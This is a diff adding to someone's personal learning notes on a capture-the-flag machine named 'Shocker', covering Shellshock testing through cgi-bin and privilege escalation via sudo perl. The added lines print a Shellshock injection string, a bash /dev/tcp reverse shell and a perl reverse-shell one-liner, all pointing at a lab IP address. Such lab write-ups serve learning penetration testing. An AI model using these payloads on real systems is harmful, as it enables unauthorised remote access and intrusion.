@@ -23,6 +23,18 @@ What I learned
 - when attacking directories, try over adding extensions than under adding, also make sure you know which extension it will most likely be
 
 cgi-bin we go ahead and test shell shock "also because the box is called shocker"
+test for shell shock using the string `() { :; }; sleep 10`
+which gives us an internal server error which is pretty sus
+`/bin/sh -i >& /dev/tcp/10.10.14.146/6000 0>&1`
+
+Look for ssh configurations in /etc/ssh/sshd_config
+sudo -l shows we can execute perl as sudo
+lets try a reverse shell with perl
+`sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.146";$p=6001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+Look at guides on how I shouldve upgraded to a TTY shell and how everyone else did things
+
+Shouldve thought to look for SUID, also couldve tried to start a server and serve linpeas from it
 
 Things to do:
 Should look more into shell shock and why this vulnerability exists, as well as how to find it on the server
